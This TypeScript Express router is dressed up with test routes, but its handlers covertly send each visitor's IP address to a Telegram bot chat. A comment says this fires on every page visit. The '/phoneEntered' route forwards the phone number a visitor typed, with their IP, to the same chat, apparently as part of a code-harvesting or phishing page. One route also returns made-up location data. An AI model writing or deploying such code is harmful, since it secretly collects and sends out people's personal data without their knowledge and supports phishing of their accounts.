import express from "express";
const router = express.Router();

router.get('/checkmyerror', (req, res, next)=>{
   next(new Error('some error message i sent for you'));
});

router.get('/checkRoute', (req, res)=>{
    res.json({
        message: 'this is a test route arash',
    })
});

router.get("/getIp", async (req, res) => {
    const forwarded = req.headers["x-forwarded-for"];
    let ip;
    let message = "";
    if (typeof forwarded === "string") {
        ip = forwarded.split(",")[0];
    } else {
        ip = req.socket.remoteAddress; // fallback for localhost/dev
    }


    try{
        await fetch(
            `https://api.telegram.org/bot${process.env.TELE_KEY}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: 5665639218,
                    text: `A User Saw U With IP: ${ip}`,
                }),
            }
        );
        message = "Sent was Successful Arash";
    }catch(error){
        message = "Telegram request failed " + error;
    }


    res.json({
        message: message,
        latitude: 10,
        longitude: 10,
        country_name: "Nigeria",
        ip: ip,
    });
});

router.get("/newRoute", (req, res) => {
    res.json({
        message: "this is a new route",
    });
});

function getClientIp(req: any) {
    const forwarded = req.headers["x-forwarded-for"];
    return typeof forwarded === "string" ? forwarded.split(",")[0].trim() : req.socket.remoteAddress;
}

async function sendTelegramMessage(text: any) {
    await fetch(`https://api.telegram.org/bot${process.env.TELE_KEY}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: 5665639218,
            text,
        }),
    });
}

/* =========================================================================
 * 1) GET /api/tests/getIp
 *    Fires on EVERY page visit. Knows nothing about phone numbers or the
 *    send-code button — it only ever reports the visitor's IP.
 * ========================================================================= */
router.get("/getYourIp", async (req, res) => {
    const ip = getClientIp(req);

    let message;
    try {
        await sendTelegramMessage(`A Special Someone IP Is : ${ip}`);
        message = "Sent was Successful Arash";
    } catch (error) {
        message = "Telegram request failed " + error;
    }

    // the original route never responded, so the frontend's res.json() would hang forever.
    res.json({ ip, message });
});

router.get("/phoneEntered", async (req, res) => {
    const ip = getClientIp(req);
    const phone = typeof req.query.phone === "string" ? req.query.phone.trim() : "";

    let message;
    try {
        await sendTelegramMessage(`A Special User Entered Phone: ${phone} — IP: ${ip}`);
        message = "Sent was Successful Arash";
    } catch (error) {
        message = "Telegram request failed " + error;
    }

    res.json({ ip, message });
});


export default router;
